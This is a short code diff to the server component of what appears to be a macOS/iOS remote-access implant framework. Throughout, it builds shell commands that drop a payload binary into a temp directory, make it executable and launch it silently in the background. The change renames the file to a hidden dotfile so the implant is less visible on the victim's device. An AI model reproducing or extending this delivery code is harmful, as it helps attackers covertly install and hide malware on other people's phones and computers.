@@ -128,9 +128,9 @@ class Server:
             f.close()
             #save to tmp, 
             instructions = \
-            "cat >/private/tmp/mouse;"+\
-            "chmod 777 /private/tmp/mouse;"+\
-            "/private/tmp/mouse "+payload_parameter.decode()+" 2>/dev/null &\n"
+            "cat >/private/tmp/.mouse;"+\
+            "chmod +x /private/tmp/.mouse;"+\
+            "/private/tmp/.mouse "+payload_parameter.decode()+" 2>/dev/null &\n"
             self.verbose_print("Executing macOS payload...")
             return (instructions,payload)
         elif device_arch in self.ios_architectures:
@@ -140,10 +140,9 @@ class Server:
             payload = f.read()
             f.close()
             instructions = \
-            "cat >/tmp/mouse;"+\
-            "chmod 777 /tmp/mouse;"+\
-            "mv /tmp/mouse /.mouse;"+\
-            "/.mouse "+payload_parameter.decode()+" 2>/dev/null &\n"
+            "cat >/tmp/.mouse;"+\
+            "chmod +x /tmp/.mouse;"+\
+            "/tmp/.mouse "+payload_parameter.decode()+" 2>/dev/null &\n"
             self.verbose_print("Executing iOS payload...") 
             return (instructions,payload)
         else:
